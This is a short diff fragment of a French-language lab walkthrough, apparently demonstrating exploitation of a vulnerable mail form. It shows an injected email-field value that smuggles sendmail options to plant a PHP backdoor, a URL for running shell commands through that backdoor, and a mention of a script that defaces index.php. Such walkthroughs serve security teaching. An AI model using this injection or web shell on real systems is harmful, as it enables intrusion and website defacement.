@@ -47,6 +47,9 @@ avec Your Email : ```"vulnerables\" -OQueueDirectory=/tmp -X/www/backdoor.php se
 
 ![](manuelle1.png)
 
+Ceci va permet d'injecter le malicious code, et pour l'evoie de commande il suffit de consulter:
+```localhost:8080/backdoor.php/cmd=commande```
+Avec commande c'est la commande à exécuter.
 
 Étape3: C'est intéressant, mais pour tester quelque chose de plus concrète, lancant le script "second_use_case.sh" qui exécute une commande sur le shell distant qui permet d'écraser le contenu du ficher "index.php" par une page noire contant le mot "defaced".
 ```
